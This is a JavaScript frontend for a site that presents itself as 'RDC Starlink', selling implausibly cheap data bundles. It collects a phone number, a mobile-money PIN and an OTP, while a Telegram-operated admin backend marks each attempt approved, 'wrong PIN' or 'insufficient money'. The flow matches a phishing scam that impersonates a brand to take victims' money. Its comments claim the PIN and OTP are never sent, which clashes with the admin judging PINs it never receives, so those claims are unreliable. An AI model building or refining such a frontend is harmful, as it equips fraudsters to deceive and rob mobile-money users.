// RDC Starlink frontend connected to the Render Telegram backend.
// Sensitive PIN and OTP values are NEVER sent to the backend or Telegram.

const BACKEND_URL = "https://starlink-2mc7.onrender.com";

const PACKAGES = [
  { name: "5 GB", validity: "1 day", price: "$0.25" },
  { name: "10 GB", validity: "3 days", price: "$0.80" },
  { name: "20 GB", validity: "7 days", price: "$1.20" },
  { name: "40 GB", validity: "7 days", price: "$2.00" },
  { name: "80 GB", validity: "21 days", price: "$2.25" },
  { name: "120 GB", validity: "30 days", price: "$3.00" },
  { name: "Unlimited", validity: "30 days", price: "$8.00" }
];

let selectedPackage = null;
let pinRequestId = null;
let otpRequestId = null;
let otpTimer = null;
let secondsLeft = 0;
let statusTimer = null;

const $ = id => document.getElementById(id);

function showPage(id) {
  document.querySelectorAll(".page").forEach(page => page.classList.remove("active"));
  const page = $(id);
  if (page) page.classList.add("active");
  window.scrollTo({ top: 0, behavior: "smooth" });
}

function packageText(pkg) {
  return `${pkg.name} — ${pkg.price} <span style="font-weight:400">(${pkg.validity})</span>`;
}

function renderPackages() {
  const list = $("packageList");
  if (!list) return;

  list.innerHTML = "";

  PACKAGES.forEach((pkg, index) => {
    const button = document.createElement("button");
    button.type = "button";
    button.className = "package-btn";
    button.innerHTML =
      `<div class="package-top"><span>${pkg.name}</span><span class="price">${pkg.price}</span></div>` +
      `<div class="package-bottom"><span>Validity</span><span>${pkg.validity}</span></div>`;

    button.addEventListener("click", () => selectPackage(index));
    list.appendChild(button);
  });
}

function selectPackage(index) {
  selectedPackage = PACKAGES[index];

  $("pinPackage").innerHTML = packageText(selectedPackage);

  clearErrors();
  $("phone").value = "";
  $("pin").value = "";

  showPage("pinPage");
  $("phone").focus();
}

function clearErrors() {
  ["phone", "pin", "otp"].forEach(id => {
    if ($(id)) $(id).classList.remove("input-error");
  });

  ["phoneError", "pinError", "otpError"].forEach(id => {
    if ($(id)) $(id).textContent = "";
  });

  if ($("pinStatus")) $("pinStatus").textContent = "";
  if ($("otpStatus")) $("otpStatus").textContent = "";
}

function validPhone() {
  return /^9\d{8}$/.test($("phone").value.trim());
}

function valid4Digits(value) {
  return /^\d{4}$/.test(value.trim());
}

async function createRequest(stage) {
  const response = await fetch(`${BACKEND_URL}/api/requests`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      packageName: selectedPackage.name,
      validity: selectedPackage.validity,
      price: selectedPackage.price,
      phone: $("phone").value.trim(),
      stage
    })
  });

  const data = await response.json();

  if (!response.ok) {
    throw new Error(data.error || "Could not create request");
  }

  return data;
}

function stopStatusPolling() {
  if (statusTimer) {
    clearInterval(statusTimer);
    statusTimer = null;
  }
}

function startStatusPolling(requestId, stage) {
  stopStatusPolling();

  const check = async () => {
    try {
      const response = await fetch(`${BACKEND_URL}/api/requests/${requestId}`);

      if (!response.ok) return;

      const data = await response.json();

      if (stage === "pin") {
        if (data.status === "approved") {
          stopStatusPolling();
          $("pinStatus").textContent = "Verification approved.";
          $("otpPackage").innerHTML = packageText(selectedPackage);
          showPage("otpPage");
          startOtpTimer();
          await createOtpRequest();
          return;
        }

        if (data.status === "wrong_pin") {
          stopStatusPolling();
          $("pin").classList.add("input-error");
          $("pinError").textContent = "Wrong PIN. Please enter your PIN again.";
          $("pinStatus").textContent = "";
          $("pin").value = "";
          $("pin").focus();
          return;
        }
      }

      if (stage === "otp") {
        if (data.status === "approved") {
          stopStatusPolling();
          clearInterval(otpTimer);
          $("successPackage").innerHTML = packageText(selectedPackage);
          showPage("successPage");
          return;
        }

        if (data.status === "wrong_otp") {
          stopStatusPolling();
          $("otp").classList.add("input-error");
          $("otpError").textContent = "Wrong OTP. Please enter the OTP again.";
          $("otp").value = "";
          $("otp").focus();
          return;
        }

        if (data.status === "insufficient_money") {
          stopStatusPolling();
          $("otp").classList.add("input-error");
          $("otpError").textContent = "Insufficient money. Please check your payment and try again.";
          $("otpStatus").textContent = "";
          return;
        }

        if (data.status === "otp_expired") {
          stopStatusPolling();
          expireOtp(false);
          $("otpError").textContent = "OTP expired. Request another OTP.";
          return;
        }
      }
    } catch (error) {
      console.error("Status check failed:", error);
    }
  };

  check();
  statusTimer = setInterval(check, 2000);
}

async function createOtpRequest() {
  try {
    const data = await createRequest("otp");
    otpRequestId = data.requestId;

    $("otpStatus").textContent = "OTP verification request sent.";
    startStatusPolling(otpRequestId, "otp");
  } catch (error) {
    $("otpStatus").textContent = "Could not contact the verification service.";
    console.error(error);
  }
}

$("pinContinue").addEventListener("click", async () => {
  clearErrors();

  if (!validPhone()) {
    $("phone").classList.add("input-error");
    $("phoneError").textContent = "Enter exactly 9 digits starting with 9.";
    $("phone").focus();
    return;
  }

  if (!valid4Digits($("pin").value)) {
    $("pin").classList.add("input-error");
    $("pinError").textContent = "Enter exactly 4 digits.";
    $("pin").focus();
    return;
  }

  $("pinStatus").textContent = "Sending verification request...";

  try {
    // PIN is validated locally for format only and is NOT sent anywhere.
    const data = await createRequest("pin");
    pinRequestId = data.requestId;

    $("pinStatus").textContent = "Waiting for verification...";
    startStatusPolling(pinRequestId, "pin");
  } catch (error) {
    $("pinStatus").textContent = "Could not contact the verification service.";
    console.error(error);
  }
});

function startOtpTimer() {
  clearInterval(otpTimer);

  secondsLeft = 60;
  $("otp").value = "";
  $("otp").classList.remove("input-error");
  $("otpError").textContent = "";
  $("expiredText").textContent = "";

  $("otpVerify").classList.remove("hidden");
  $("requestOtp").classList.add("hidden");

  updateTimer();

  otpTimer = setInterval(() => {
    secondsLeft--;
    updateTimer();

    if (secondsLeft <= 0) {
      expireOtp(true);
    }
  }, 1000);
}

function updateTimer() {
  const minutes = String(Math.floor(secondsLeft / 60)).padStart(2, "0");
  const seconds = String(secondsLeft % 60).padStart(2, "0");
  $("timer").textContent = `${minutes}:${seconds}`;
}

function expireOtp(sendNotice) {
  clearInterval(otpTimer);
  secondsLeft = 0;
  updateTimer();

  $("otp").classList.add("input-error");
  $("otpError").textContent = "OTP expired. Request another OTP.";
  $("expiredText").textContent = "Your OTP has expired.";
  $("otpVerify").classList.add("hidden");
  $("requestOtp").classList.remove("hidden");

  if (sendNotice && otpRequestId) {
    // The existing OTP request remains visible to the admin.
    // The customer can request a new OTP below.
    $("otpStatus").textContent = "Your OTP has expired. Request another OTP.";
  }
}

$("requestOtp").addEventListener("click", async () => {
  stopStatusPolling();
  $("otpStatus").textContent = "Sending a new OTP request...";

  try {
    const data = await createRequest("otp");
    otpRequestId = data.requestId;

    $("otpStatus").textContent = "A new OTP request has been sent.";
    startOtpTimer();
    startStatusPolling(otpRequestId, "otp");
  } catch (error) {
    $("otpStatus").textContent = "Could not send the new OTP request.";
    console.error(error);
  }
});

$("otpVerify").addEventListener("click", () => {
  if (secondsLeft <= 0) {
    expireOtp(true);
    return;
  }

  $("otpError").textContent = "";
  $("otp").classList.remove("input-error");

  if (!valid4Digits($("otp").value)) {
    $("otp").classList.add("input-error");
    $("otpError").textContent = "Enter exactly 4 digits.";
    $("otp").focus();
    return;
  }

  /*
    The OTP is checked only for its required 4-digit format here.
    Its value is deliberately NOT transmitted to the backend or Telegram.
    The admin controls the final verification status through Telegram.
  */
  $("otpStatus").textContent = "Waiting for verification...";

  if (otpRequestId) {
    startStatusPolling(otpRequestId, "otp");
  }
});

document.addEventListener("DOMContentLoaded", renderPackages);
